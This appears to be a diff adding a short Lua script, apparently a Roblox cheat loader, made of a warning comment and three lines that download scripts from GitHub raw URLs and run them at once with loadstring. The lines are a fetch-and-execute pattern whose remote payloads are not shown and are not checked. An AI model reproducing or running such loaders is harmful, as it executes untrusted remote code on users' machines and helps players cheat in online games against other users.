@@ -1,0 +1,4 @@
+-- Warning: Do not use this.
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ackster11/DaHood/main/Part1", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ackster11/DaHood/main/Part2", true))()
